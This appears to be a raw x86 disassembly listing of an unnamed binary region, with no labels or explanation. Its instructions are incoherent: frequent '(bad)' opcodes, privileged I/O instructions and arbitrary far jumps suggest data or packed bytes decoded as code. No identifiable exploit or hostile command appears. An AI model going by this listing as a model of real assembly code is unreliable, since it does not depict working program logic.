  412c06:	ret    0xbd1a
  412c09:	pop    ecx
  412c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c0b:	jno    0x412b91
  412c0d:	dec    esi
  412c0e:	jecxz  0x412c81
  412c10:	in     al,dx
  412c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c12:	dec    ebx
  412c13:	xlat   BYTE PTR ds:[ebx]
  412c14:	or     ebx,esi
  412c16:	repnz repnz adc bl,BYTE PTR [edx-0x685ba42]
  412c1e:	ins    DWORD PTR es:[edi],dx
  412c1f:	test   eax,ebx
  412c21:	jb     0x412c93
  412c23:	popf   
  412c24:	push   ss
  412c25:	adc    eax,0x344ca0ae
  412c2a:	or     al,0xb2
  412c2c:	jge    0x412c8a
  412c2e:	xor    eax,0x487b1a29
  412c33:	retf   0x329d
  412c36:	or     BYTE PTR ds:0xe6190f3a,dh
  412c3c:	dec    ecx
  412c3d:	arpl   bp,si
  412c3f:	push   es
  412c40:	inc    edx
  412c41:	mov    ebp,0x8de20670
  412c46:	ja     0x412cc6
  412c48:	xor    al,0x3d
  412c4a:	cmp    dl,BYTE PTR [ecx]
  412c4c:	push   ss
  412c4d:	jo     0x412c27
  412c4f:	pop    ds
  412c50:	push   ds
  412c51:	mov    ch,BYTE PTR [ecx-0x50]
  412c54:	scas   eax,DWORD PTR es:[edi]
  412c55:	lods   eax,DWORD PTR ds:[esi]
  412c56:	dec    ecx
  412c57:	xchg   esi,eax
  412c58:	imul   esp,DWORD PTR [ebp+0x72],0x24
  412c5c:	jo     0x412c34
  412c5e:	fwait
  412c5f:	repz mov edx,0x1c42a67f
  412c65:	inc    ebx
  412c66:	arpl   ax,ax
  412c68:	clc    
  412c69:	pop    es
  412c6a:	or     BYTE PTR ds:[esi+edx*8-0x1280c58],0x93
  412c73:	jp     0x412cf0
  412c75:	jae    0x412caf
  412c77:	push   edx
  412c78:	sbb    DWORD PTR [ebx+ebp*1+0x5c88f346],ebp
  412c7f:	ss xchg ecx,eax
  412c81:	or     esp,edi
  412c83:	jae    0x412c5e
  412c85:	sbb    DWORD PTR [ebx+0x53],eax
  412c88:	(bad)  
  412c8a:	(bad)  
  412c8b:	cs and eax,ecx
  412c8e:	pop    edi
  412c8f:	leave  
  412c90:	lea    esp,[esi-0x5d]
  412c93:	xor    BYTE PTR [edx-0x50],0x58
  412c97:	jp     0x412cfa
  412c99:	adc    esi,esp
  412c9b:	outs   dx,DWORD PTR ds:[esi]
  412c9c:	mov    ah,0x47
  412c9e:	imul   ebx,DWORD PTR [eax+0x45f14318],0x23
  412ca5:	cmp    bh,bh
  412ca7:	jp     0x412c79
  412ca9:	sar    cl,0x95
  412cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cad:	or     ch,BYTE PTR [esp+ecx*4]
  412cb0:	pop    ss
  412cb1:	imul   ah
  412cb3:	cs popa 
  412cb5:	sbb    al,bl
  412cb7:	push   DWORD PTR [edi+ecx*4+0x32]
  412cbb:	jmp    0x1c60:0x6e7eb55f
  412cc2:	mov    bh,0xe7
  412cc4:	push   ecx
  412cc5:	jg     0x412c82
  412cc7:	sbb    BYTE PTR [edi-0x6a],bl
  412cca:	ror    edx,1
  412ccc:	mov    ds:0xad695180,al
  412cd1:	lods   al,BYTE PTR ds:[esi]
  412cd2:	addr16 sub eax,0xd0c484b9
  412cd8:	sbb    bl,BYTE PTR [edi]
  412cda:	jg     0x412caf
  412cdc:	bndldx bnd2,[edi+0x3]
  412ce0:	dec    edi
  412ce1:	jg     0x412c8d
  412ce3:	in     eax,dx
  412ce4:	clc    
  412ce5:	(bad)  
  412ce6:	(bad)  
  412ce7:	hlt    
  412ce8:	pop    edi
  412ce9:	in     al,dx
  412cea:	jle    0x412ca2
  412cec:	jmp    0xd60:0xb2f9d10c
  412cf3:	test   BYTE PTR [edx*2-0x11b8b932],0x15
  412cfb:	mov    ecx,0x221971fb
  412d00:	stos   DWORD PTR es:[edi],eax
  412d01:	aas    
  412d02:	sub    BYTE PTR [esi-0x39abd88e],bl
  412d08:	ret    
  412d09:	lods   al,BYTE PTR ds:[esi]
  412d0a:	rol    DWORD PTR [edi+eax*1-0x13d51379],cl
  412d11:	sub    DWORD PTR [edi],0xffffffd6
  412d14:	xor    al,0x1e
  412d16:	mov    esi,DWORD PTR [edi+0x3ac13652]
  412d1c:	xchg   ebx,eax
  412d1d:	mov    edi,0xf6d3c057
  412d22:	gs aad 0xf2
  412d25:	push   es
  412d26:	mov    dh,0xc5
  412d28:	or     BYTE PTR [esi+0x731081d9],al
  412d2e:	fcom   DWORD PTR [ebx-0xc5573eb]
  412d34:	jecxz  0x412da6
  412d36:	and    ebx,DWORD PTR cs:[ebx+0x3e]
  412d3a:	in     al,0x16
  412d3c:	inc    edx
  412d3d:	mov    BYTE PTR [ebp+0x46],al
  412d40:	mov    cl,0x53
  412d42:	hlt    
  412d43:	fiadd  DWORD PTR [ecx+0x1422ef03]
  412d49:	sbb    eax,0x9b80557e
  412d4e:	and    dh,dh
  412d50:	and    DWORD PTR [ecx-0x5e],edx
  412d53:	push   edi
  412d54:	dec    ebp
  412d55:	frstor [eax+0x71]
  412d58:	popf   
  412d59:	add    dh,BYTE PTR [ebx+0x210007d9]
  412d5f:	retf   0xee42
  412d62:	push   0x39
  412d64:	xchg   edx,eax
  412d65:	mov    bh,0x98
  412d67:	sbb    eax,0xb906022f
  412d6c:	pop    esi
  412d6d:	add    dh,al
  412d6f:	xor    dh,BYTE PTR [esi-0x3165db60]
  412d75:	inc    edx
  412d76:	cld    
  412d77:	addr16 addr16 retf 0xa96f
  412d7c:	add    eax,0xbf809433
  412d81:	mov    bl,0xa
  412d83:	stos   BYTE PTR es:[edi],al
  412d84:	je     0x412d47
  412d86:	cmp    esp,edi
  412d88:	ret    
  412d89:	adc    BYTE PTR [edx],cl
  412d8b:	in     al,0xa4
  412d8d:	lahf   
  412d8e:	js     0x412d9a
  412d90:	mov    esi,0xdc27472
  412d95:	adc    esi,esi
  412d97:	lea    ebp,[edx+0x32]
  412d9a:	or     dl,BYTE PTR [eax]
  412d9c:	sbb    al,0x85
  412d9e:	repz mov dh,0xdc
  412da1:	adc    edx,edi
  412da3:	mov    BYTE PTR [edx+edi*4+0x2f],bh
  412da7:	(bad)  
  412da8:	nop
  412da9:	mov    cs,WORD PTR [eax]
  412dab:	add    eax,0x8d54294c
  412db0:	fs pop edx
  412db2:	cmp    BYTE PTR [ecx-0x46],cl
  412db5:	or     dl,dl
  412db7:	std    
  412db8:	sub    eax,0x6992f80f
  412dbd:	xchg   ecx,eax
  412dbe:	adc    eax,0x865b92e7
  412dc3:	pop    ecx
  412dc4:	jns    0x412dbc
  412dc6:	sbb    BYTE PTR [ebp+0x265d09ef],bh
  412dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dcd:	(bad)  
  412dce:	pop    edi
  412dcf:	mov    al,0xff
  412dd1:	sub    DWORD PTR [edi],esi
  412dd3:	ins    DWORD PTR es:[edi],dx
  412dd4:	lods   eax,DWORD PTR ds:[esi]
  412dd5:	jne    0x412df5
  412dd7:	and    ch,bh
  412dd9:	hlt    
  412dda:	push   ebx
  412ddb:	cs inc ebx
  412ddd:	stc    
  412dde:	mov    eax,0x4c6b2341
  412de3:	rcl    BYTE PTR [ebx-0x2367bcf0],1
  412de9:	rol    bl,0xf9
  412dec:	mov    ds:0x96151f64,al
  412df1:	jns    0x412e2b
  412df3:	and    bl,BYTE PTR [ebx-0x52]
  412df6:	xlat   BYTE PTR ds:[ebx]
  412df7:	idiv   BYTE PTR [edx+0x2d]
  412dfa:	dec    edi
  412dfb:	and    eax,0x11262c12
  412e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e01:	aas    
  412e02:	add    edi,ebx
  412e04:	pop    ss
  412e05:	xor    BYTE PTR ds:0xd800a147,bl
  412e0b:	leave  
  412e0c:	fisub  WORD PTR [eax]
  412e0e:	jnp    0x412d96
  412e10:	dec    eax
  412e11:	ja     0x412dc9
  412e13:	jmp    0x412db4
  412e15:	sahf   
  412e16:	cwde   
  412e17:	pop    ebp
  412e18:	sub    bl,bl
  412e1a:	pop    esi
  412e1b:	lds    ebx,FWORD PTR [esi+0x75d25143]
  412e21:	leave  
  412e22:	ret    0xc16a
  412e25:	mov    esi,0x187a58b2
  412e2a:	xlat   BYTE PTR ds:[ebx]
  412e2b:	push   0xb7031f52
  412e30:	pop    edi
  412e31:	aas    
  412e32:	lahf   
  412e33:	mov    cl,0xf2
  412e35:	and    eax,0xd74677e2
  412e3a:	in     al,0xc7
  412e3c:	addr16 pop edx
  412e3e:	inc    edx
  412e3f:	push   ss
  412e40:	add    bl,BYTE PTR ds:0xabc6e15a
  412e46:	mov    DWORD PTR [ecx-0x5c9efe],esp
  412e4c:	js     0x412ecd
  412e4e:	jl     0x412e8c
  412e50:	dec    esi
  412e51:	sahf   
  412e52:	xor    edx,DWORD PTR [eax]
  412e54:	popa   
  412e55:	jne    0x412de5
  412e57:	jecxz  0x412ec1
  412e59:	sbb    esp,esi
  412e5b:	sbb    al,0xae
  412e5d:	jb     0x412ebf
  412e5f:	push   0x1a
  412e61:	fsubr  st(1),st
  412e63:	fld    TBYTE PTR [edx-0x1e8bc54a]
  412e69:	rcr    DWORD PTR [edi+0x67],1
  412e6c:	cwde   
  412e6d:	cmp    dl,BYTE PTR [eax+ebp*1]
  412e70:	mov    ebp,0xf53f6616
  412e75:	in     eax,0x7d
  412e77:	or     BYTE PTR [edi+0x4e],bl
  412e7a:	xor    eax,0xa795efa2
  412e7f:	and    al,BYTE PTR [esi]
  412e81:	push   ebp
  412e82:	jae    0x412e66
  412e84:	mov    ebx,0x39bc6a11
  412e89:	jge    0x412f05
  412e8b:	cmc    
  412e8c:	dec    edx
  412e8d:	fisub  DWORD PTR [ebp-0x299f5be0]
  412e93:	ss stc 
  412e95:	xor    bh,dl
  412e97:	dec    edx
  412e98:	xchg   ecx,eax
  412e99:	scas   al,BYTE PTR es:[edi]
  412e9a:	outs   dx,DWORD PTR ds:[esi]
  412e9b:	out    0xe6,eax
  412e9d:	jmp    0x2fc3:0xb2bd1ef8
  412ea4:	adc    eax,0xa542b64e
  412ea9:	push   0xffffffdc
  412eab:	push   esp
  412eac:	cmp    eax,0xaaad6cd6
  412eb1:	clc    
  412eb2:	fst    st(4)
  412eb4:	cdq    
  412eb5:	iret   
  412eb6:	cmp    al,0xed
  412eb8:	add    eax,0xdab4029
  412ebd:	arpl   WORD PTR ss:[eax+0x5af8a23a],ax
  412ec4:	stos   BYTE PTR es:[edi],al
  412ec5:	push   edi
  412ec6:	mov    BYTE PTR [edx-0xb709cec],0x7a
  412ecd:	add    edx,ecx
  412ecf:	dec    esp
  412ed0:	pop    ss
  412ed1:	repz div BYTE PTR [esi]
  412ed4:	cmp    BYTE PTR [esi],ah
  412ed6:	cmp    bh,ch
  412ed8:	or     BYTE PTR [ebp-0x76],dh
  412edb:	aad    0xbb
  412edd:	es pushf 
  412edf:	pop    ss
  412ee0:	js     0x412efb
  412ee2:	push   ebx
  412ee3:	sbb    DWORD PTR [eax+0x3d],ecx
  412ee6:	repz adc BYTE PTR [ebx],dl
  412ee9:	xchg   edx,eax
  412eea:	mul    DWORD PTR [edx-0x78f429ff]
  412ef0:	aaa    
  412ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef2:	mov    DWORD PTR [edx+0x4767d5a7],edx
  412ef8:	fdiv   st,st(4)
  412efa:	dec    eax
  412efb:	sbb    BYTE PTR [esi+0x307a3e9e],bl
  412f01:	and    DWORD PTR [ebx],ebx
  412f03:	xor    al,0x7d
  412f05:	adc    eax,0x1134e0cf
  412f0a:	and    eax,0xa9f4dfab
  412f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f10:	das    
  412f11:	test   eax,0x1300a110
  412f16:	mov    ds:0x5cd5d9f3,eax
  412f1b:	popf   
  412f1c:	add    al,BYTE PTR [edi-0x3835ed68]
  412f22:	push   cs
  412f23:	shl    BYTE PTR [esi+eax*2-0x5e],1
  412f27:	daa    
  412f28:	fld    DWORD PTR [edi+0x7b]
  412f2b:	add    eax,0xcf7f3a4d
  412f30:	or     ebx,esi
  412f32:	out    0xcd,eax
  412f34:	jg     0x412f6d
  412f36:	xor    esp,DWORD PTR [ecx-0x522de665]
  412f3c:	and    ebx,DWORD PTR gs:[edi+0x507d7c76]
  412f43:	aam    0x5d
  412f45:	loopne 0x412f43
  412f47:	scas   al,BYTE PTR es:[edi]
  412f48:	xchg   BYTE PTR [eax-0x17],cl
  412f4b:	inc    edi
  412f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f4d:	gs lahf 
  412f4f:	mov    eax,ds:0x2dd6b099
  412f54:	dec    eax
  412f55:	lea    esi,gs:[ecx]
  412f58:	sub    esi,DWORD PTR [ecx-0xf4b59c7]
  412f5e:	mov    edi,0x76303939
  412f63:	daa    
  412f64:	cmp    DWORD PTR [eax+0x2df8c93d],ebp
  412f6a:	push   es
  412f6b:	mov    al,ds:0x55d46f68
  412f70:	dec    ebp
  412f71:	jae    0x412f2b
  412f73:	xchg   ebp,eax
  412f74:	ficomp DWORD PTR [edi+0x70ceca3d]
  412f7a:	mov    ah,0xad
  412f7c:	sbb    edx,eax
  412f7e:	pop    ecx
  412f7f:	inc    edi
  412f80:	xchg   ebx,eax
  412f81:	inc    eax
  412f82:	in     eax,dx
  412f83:	xor    eax,0x82d2fd28
  412f88:	std    
  412f89:	sbb    bh,al
  412f8b:	or     esi,DWORD PTR [esi-0x5f]
  412f8e:	jns    0x412f2b
  412f90:	mov    eax,gs
  412f92:	mov    esi,0x1732f387
  412f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f98:	arpl   ax,bx
  412f9a:	out    dx,eax
  412f9b:	mov    eax,ds:0x15c71582
  412fa0:	or     BYTE PTR [ecx+0x5d824b8b],al
  412fa6:	and    al,dl
  412fa8:	inc    esi
  412fa9:	jle    0x412fed
  412fab:	shr    DWORD PTR [eax],1
  412fad:	nop
  412fae:	or     DWORD PTR [ebx+ebp*1+0x6857f29b],ebx
  412fb5:	sbb    eax,0x2ce1ce99
  412fba:	mov    ds:0xebac3aed,eax
  412fbf:	xor    dl,al
  412fc1:	clc    
  412fc2:	dec    edx
  412fc3:	fmul   st,st(6)
  412fc5:	pop    ecx
  412fc6:	xchg   esp,eax
  412fc7:	or     esp,esp
  412fc9:	lock test ch,cl
  412fcc:	push   edi
  412fcd:	fwait
  412fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fcf:	rol    BYTE PTR [edx],1
  412fd1:	sub    al,0xcc
  412fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fd5:	cmp    BYTE PTR [esi],ah
  412fd7:	lahf   
  412fd8:	addr16 out 0x11,eax
  412fdb:	add    al,0x81
  412fdd:	mov    ds:0x5a03fcef,eax
  412fe2:	inc    ecx
  412fe3:	ret    
  412fe4:	fxch   st(4)
  412fe6:	sub    BYTE PTR [edi-0x2211cc31],0xbe
  412fed:	sar    BYTE PTR [ecx],0x9d
  412ff0:	fs repnz pushf 
  412ff3:	popf   
  412ff4:	cmp    al,0xcf
  412ff6:	jl     0x412fa2
  412ff8:	sbb    BYTE PTR [ebx+0x4f6e787c],dl
  412ffe:	push   ebx
  412fff:	push   0xffffffac
  413001:	outs   dx,DWORD PTR ds:[esi]
  413002:	loope  0x413045
  413004:	cmc    
  413005:	popa   
  413006:	xor    ecx,ebp
  413008:	and    ecx,ebx
  41300a:	xor    al,0x42
  41300c:	repnz int3 
  41300e:	js     0x413032
  413010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413012:	mov    WORD PTR [ebx-0xb25aec5],fs
  413018:	std    
  413019:	pop    ecx
  41301a:	loopne 0x413041
  41301c:	pop    ds
  41301d:	xchg   BYTE PTR [esi-0x16],cl
  413020:	stos   DWORD PTR es:[edi],eax
  413021:	imul   eax,DWORD PTR [eax+0x7],0x5c
  413025:	push   0xfd8ce15b
  41302a:	fmul   DWORD PTR [eax]
  41302c:	xlat   BYTE PTR ds:[ebx]
  41302d:	adc    al,BYTE PTR [ecx-0x2c]
  413030:	hlt    
  413031:	pop    ecx
  413032:	jnp    0x413012
  413034:	aaa    
  413035:	dec    edi
  413036:	jns    0x413068
  413038:	jmp    0x412fc0
  41303a:	aas    
  41303b:	push   ebx
  41303c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41303d:	dec    ecx
  41303e:	(bad)  [ebp-0x11]
  413041:	bnd jo 0x412fe7
  413044:	ja     0x41308b
  413046:	dec    esp
  413047:	repz dec eax
  413049:	push   esp
  41304a:	mov    dl,0xd5
  41304c:	or     DWORD PTR ds:0x29f6ca6d,ebx
  413052:	mov    cl,0x5d
  413054:	pop    es
  413055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413056:	and    eax,0xcca59738
  41305b:	push   edi
  41305c:	inc    eax
  41305d:	js     0x413059
  41305f:	mov    al,ds:0x13f4a553
  413064:	push   edi
  413065:	cmp    dl,BYTE PTR ds:0xf4d4ecf4
  41306b:	adc    al,cl
  41306d:	rcr    DWORD PTR [si+0x18],cl
  413071:	retf   
  413072:	ss sub al,0xe
  413075:	push   ebp
  413076:	ror    DWORD PTR [edi-0x42dc9306],cl
  41307c:	leave  
  41307d:	dec    edx
  41307e:	dec    edi
  41307f:	adc    ebp,DWORD PTR [ebx-0x2c8b5475]
  413085:	ds dec edx
  413088:	test   DWORD PTR [ecx+0xf0da14c],ecx
  41308e:	loopne 0x4130ac
  413090:	loopne 0x4130b3
  413092:	pop    eax
  413093:	push   ebx
  413094:	jb     0x4130b3
  413096:	pop    es
  413097:	sub    esp,DWORD PTR [ebp+0x2a]
  41309a:	rol    bl,1
  41309c:	(bad)  
  41309d:	cmp    DWORD PTR ds:0xce2c2b1a,ebx
  4130a3:	jns    0x413094
  4130a5:	pop    ds
  4130a6:	dec    esi
  4130a7:	ret    
  4130a8:	dec    esi
  4130a9:	jno    0x41306e
  4130ab:	repz inc esp
  4130ad:	js     0x41309c
  4130af:	xchg   ebx,eax
  4130b0:	ins    DWORD PTR es:[edi],dx
  4130b1:	jbe    0x41305c
  4130b3:	add    ebx,ebx
  4130b5:	jl     0x41307a
  4130b7:	sbb    esp,DWORD PTR [esi+ebx*4]
  4130ba:	test   BYTE PTR [ecx+0x1da4de5c],al
  4130c0:	fisub  DWORD PTR [eax-0x43]
  4130c3:	call   0x399e:0xa6df5374
  4130ca:	pop    ebp
  4130cb:	or     eax,0xee69b2ac
  4130d0:	xor    ax,0x2013
  4130d4:	rcr    DWORD PTR [ecx+ecx*4],cl
  4130d7:	mov    ah,0xbd
  4130d9:	push   0xffffff8b
  4130db:	and    dl,BYTE PTR [esi]
  4130dd:	(bad)  
  4130df:	adc    eax,0x6710d5f5
  4130e4:	pop    ds
  4130e5:	xchg   ecx,eax
  4130e6:	test   al,0x14
  4130e8:	dec    eax
  4130e9:	xchg   DWORD PTR ds:0xeccf8947,ebx
  4130ef:	shr    ecx,1
  4130f1:	loope  0x413084
  4130f3:	mov    al,ds:0x732270c2
  4130f8:	inc    edx
  4130f9:	mov    edi,?
  4130fb:	jge    0x413113
  4130fd:	add    eax,0x65c5270e
  413102:	mov    edx,DWORD PTR [ecx+0x30]
  413105:	mov    eax,ds:0xfd74d233
  41310a:	out    0x21,al
  41310c:	mov    ebp,0x556eb03
  413111:	ins    BYTE PTR es:[edi],dx
  413112:	stos   DWORD PTR es:[edi],eax
  413113:	pop    ebp
  413114:	bound  edx,QWORD PTR [ebp-0x3e6641d8]
  41311a:	push   ecx
  41311b:	xchg   ebx,eax
  41311c:	shl    BYTE PTR [eax+eax*4],1
  41311f:	nop
  413120:	inc    ecx
  413121:	sbb    DWORD PTR [esi],edi
  413123:	mov    eax,0x2d33c8ec
  413128:	stc    
  413129:	mov    esi,0x84eeea61
  41312e:	or     al,BYTE PTR [esi-0x5fa3e54b]
  413134:	or     al,0xf4
  413136:	mov    dl,0x6a
  413138:	aad    0xdb
  41313a:	test   al,0xba
  41313c:	lods   al,BYTE PTR ds:[esi]
  41313d:	jmp    0xa013:0x438a174d
  413144:	add    al,0x3
  413146:	add    eax,0xc0dfe02e
  41314b:	push   cs
  41314c:	jmp    0x5070:0xcbf18a5d
  413153:	cmp    DWORD PTR [ebx+0x3b],edx
  413156:	sub    al,0xba
  413158:	repnz (bad) 
  41315a:	lea    edx,[esi+0x64]
  41315d:	dec    edi
  41315e:	fistp  QWORD PTR [edi+0x57f58df1]
  413164:	add    BYTE PTR ds:0x166fa33e,dl
  41316a:	and    al,0xdc
  41316c:	mov    esi,0x6eb633c1
  413171:	inc    eax
  413172:	push   eax
  413173:	ja     0x41318b
  413175:	cdq    
  413176:	xor    edx,edx
  413178:	call   0xe5db:0x28490d4b
  41317f:	test   BYTE PTR [ebx],cl
  413181:	and    DWORD PTR [edx+0x5f10a80a],0xffffffcd
  413188:	inc    edx
  413189:	jnp    0x413140
  41318b:	dec    esi
  41318c:	sub    ebx,ecx
  41318e:	rol    ebx,cl
  413190:	es popa 
  413192:	stc    
  413193:	ins    BYTE PTR es:[edi],dx
  413194:	ret    
  413195:	das    
  413196:	cmp    eax,0x9d70caf4
  41319b:	aaa    
  41319c:	xchg   edx,eax
  41319d:	ss adc eax,edx
  4131a0:	xchg   DWORD PTR [edx+0x4b],ebx
  4131a3:	or     dl,BYTE PTR [ecx+ebp*8-0x1f]
  4131a7:	add    esi,0xffffff93
  4131aa:	pop    ebp
  4131ab:	aaa    
  4131ac:	adc    esi,DWORD PTR [edx*4-0x58e482ca]
  4131b3:	dec    ecx
  4131b4:	mov    edx,0xf9c8429e
  4131b9:	push   ebp
  4131ba:	out    0x4a,eax
  4131bc:	retf   0xfbea
  4131bf:	push   edx
  4131c0:	into   
  4131c1:	in     eax,0x28
  4131c3:	lds    edi,FWORD PTR [eax]
  4131c5:	clc    
  4131c6:	dec    esi
  4131c7:	and    esp,DWORD PTR [ebp+0x10a357c3]
  4131cd:	std    
  4131ce:	mov    ds:0x9f8ee6d3,eax
  4131d3:	scas   eax,DWORD PTR es:[edi]
  4131d4:	jg     0x413208
  4131d6:	ja     0x413211
  4131d8:	jae    0x41316a
  4131da:	add    DWORD PTR [eax-0x27],0x997e77e3
  4131e1:	imul   BYTE PTR [edi+eax*8+0x2f]
  4131e5:	(bad)  
  4131e6:	div    DWORD PTR [eax]
  4131e8:	aad    0x26
  4131ea:	adc    dl,BYTE PTR [ebx+0x156be4b3]
  4131f0:	call   0xf20323e6
  4131f5:	cld    
  4131f6:	sub    BYTE PTR [esi-0x14ba1bfb],cl
  4131fc:	mov    edi,0x3dd097e6
  413201:	enter  0x618a,0xce
  413205:	ins    BYTE PTR es:[edi],dx
  413206:	dec    ecx
  413207:	aas    
  413208:	inc    esi
  413209:	xchg   esp,eax
  41320a:	(bad)  
  41320b:	pop    ss
  41320c:	push   0x2d1d14f1
  413211:	arpl   WORD PTR [ebx],dx
  413213:	lock push ecx
  413215:	fisttp QWORD PTR [ebp-0x24]
  413218:	and    al,0x75
  41321a:	mov    ds,WORD PTR [ecx]
  41321c:	pop    ecx
  41321d:	pop    esp
  41321e:	outs   dx,DWORD PTR ds:[esi]
  41321f:	lock mov ah,0x4e
  413222:	pop    esi
  413223:	jle    0x4131d8
  413225:	dec    ebx
  413226:	int3   
  413227:	fcom   DWORD PTR [ebp+0x4ff571ca]
  41322d:	add    eax,0xd9da346b
  413232:	out    dx,al
  413233:	push   esp
  413234:	(bad)  
  413235:	mov    bl,0x99
  413237:	jo     0x413230
  413239:	das    
  41323a:	sahf   
  41323b:	add    BYTE PTR [esi-0x101e0b86],bh
  413241:	pop    ds
  413242:	dec    eax
  413243:	cmc    
  413244:	pusha  
  413245:	iret   
  413246:	cmp    al,BYTE PTR [eax+0x193dd7d]
  41324c:	sub    DWORD PTR [ecx+ebx*2+0x5b],eax
  413250:	std    
  413251:	clc    
  413252:	fst    QWORD PTR [edx+0x32]
  413255:	fcmovnb st,st(6)
  413257:	mov    ds:0x240c0c4a,al
  41325c:	scas   eax,DWORD PTR es:[edi]
  41325d:	jns    0x41324a
  41325f:	mov    ecx,0x51366df2
  413264:	jb     0x413261
  413266:	dec    ebp
  413267:	dec    esi
  413268:	adc    eax,0x76b2b633
  41326d:	jnp    0x4132b9
  41326f:	(bad)  
  413271:	xor    al,0xae
  413273:	mov    ds:0x5de19264,al
  413278:	cli    
  413279:	mov    ebp,ebx
  41327b:	xor    al,0x31
  41327d:	mov    ebp,0x96502681
  413282:	aam    0xda
  413284:	push   0x3fa5b563
  413289:	add    ch,cl
  41328b:	es aad 0xd2
  41328e:	jo     0x4132cb
  413290:	ds push ecx
  413292:	adc    ebx,DWORD PTR [ebp+edx*8-0x4060325e]
  413299:	cmp    al,0xec
  41329b:	cmp    al,0x6c
  41329d:	xchg   ecx,eax
  41329e:	dec    esi
  41329f:	dec    ebx
  4132a0:	add    eax,0x8fdfd05
  4132a5:	dec    ebx
  4132a6:	xlat   BYTE PTR ds:[ebx]
  4132a7:	iret   
  4132a8:	mov    fs,WORD PTR [ecx+edx*8+0x133f6b33]
  4132af:	sti    
  4132b0:	dec    eax
  4132b1:	rcr    BYTE PTR [ebx+0x11a9ab16],0x7b
  4132b8:	sub    ch,BYTE PTR [ebx]
  4132ba:	rsm    
  4132bc:	cmp    eax,0xc2b72c9a
  4132c1:	out    0x37,al
  4132c3:	xchg   esp,eax
  4132c4:	add    eax,ecx
  4132c6:	xchg   ebp,eax
  4132c7:	pop    esp
  4132c8:	pop    ecx
  4132c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ca:	and    cl,ch
  4132cc:	sbb    edi,esp
  4132ce:	jge    0x4132fd
  4132d0:	sub    BYTE PTR [esi+0x3f],ch
  4132d3:	jmp    0x42aacdb
  4132d8:	sar    BYTE PTR [esi],1
  4132da:	xchg   esp,eax
  4132db:	jbe    0x413279
  4132dd:	adc    ecx,ebx
  4132df:	xor    ecx,DWORD PTR [ebx+0x7f7b256]
  4132e5:	pop    ss
  4132e6:	adc    edx,DWORD PTR ds:0x52d4cc4b
  4132ec:	rcr    DWORD PTR [esi-0x71],1
  4132ef:	xchg   esi,eax
  4132f0:	add    BYTE PTR [edx-0x5b618e99],al
  4132f6:	xchg   ecx,eax
  4132f7:	cwde   
  4132f8:	aaa    
  4132f9:	pop    eax
  4132fa:	outs   dx,DWORD PTR ds:[esi]
  4132fb:	cwde   
  4132fc:	rcr    BYTE PTR [ecx+0x2b315f8e],cl
  413302:	(bad)  
  413303:	into   
  413304:	sbb    al,0xf4
  413306:	(bad)  
  413308:	sbb    esp,ebp
  41330a:	cwde   
  41330b:	sub    DWORD PTR [ecx+0x7a1115e4],0x359ce5c6
  413315:	int3   
  413316:	adc    al,0x97
  413318:	loopne 0x4132f4
  41331a:	cmp    al,0x49
  41331c:	pop    ecx
  41331d:	inc    ecx
  41331e:	loop   0x413365
  413320:	jg     0x413309
  413322:	sbb    BYTE PTR [esi-0x40],ah
  413325:	pop    ss
  413326:	inc    eax
  413327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413328:	inc    esi
  413329:	mov    BYTE PTR [edx+0x1a],bl
  41332c:	cmp    ebp,ebp
  41332e:	retf   0xef90
  413331:	out    dx,al
  413332:	outs   dx,DWORD PTR ds:[esi]
  413333:	cmp    BYTE PTR [ecx-0x9],al
  413336:	pop    esi
  413337:	jp     0x41335e
  413339:	sbb    eax,0x87151fba
  41333e:	cmp    edi,ebx
  413340:	sub    DWORD PTR [ebx],ebp
  413342:	icebp  
  413343:	(bad)  
  413344:	sub    esp,DWORD PTR [ecx-0x313178f]
  41334a:	enter  0xb28e,0x65
  41334e:	jno    0x4133a0
  413350:	mov    ds:0x500d931f,al
  413355:	cdq    
  413356:	mov    dh,0xcc
  413358:	xchg   edi,eax
  413359:	in     al,dx
  41335a:	mov    ds:0x45d6edce,eax
  41335f:	dec    esp
  413360:	push   0x23615a16
  413365:	mov    ecx,ebx
  413367:	jle    0x41338b
  413369:	jbe    0x413362
  41336b:	mov    ah,bl
  41336d:	in     al,0xed
  41336f:	add    esi,DWORD PTR [ecx+0x14da9ded]
  413375:	add    ebp,DWORD PTR [edx+0x2eb724eb]
  41337b:	ins    DWORD PTR es:[edi],dx
  41337c:	repz sub eax,0xb862c002
  413382:	sub    bh,bl
  413384:	adc    DWORD PTR [eax+eiz*4],edi
  413387:	jmp    0xdd421d35
  41338c:	outs   dx,DWORD PTR ds:[esi]
  41338d:	repz jp 0x413374
  413390:	mov    ebp,0x8579cbba
  413395:	jl     0x4133c5
  413397:	dec    edx
  413398:	jae    0x413398
  41339a:	clc    
  41339b:	je     0x413418
  41339d:	lahf   
  41339e:	sbb    al,0xce
  4133a0:	sbb    ebx,ebx
  4133a2:	sub    edx,edx
  4133a4:	cmp    ch,dl
  4133a6:	pop    edx
  4133a7:	mov    al,ds:0x34c9b382
  4133ac:	pop    ds
  4133ad:	push   cs
  4133ae:	jmp    0xb4ab:0x3f514035
  4133b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b6:	push   edi
  4133b7:	pop    ebx
  4133b8:	fnstcw WORD PTR [ecx]
  4133ba:	jle    0x413370
  4133bc:	mov    al,0x59
  4133be:	push   ebp
  4133bf:	imul   edi,DWORD PTR [esi+eiz*8],0x6
  4133c3:	repnz fild DWORD PTR [ecx+eiz*2]
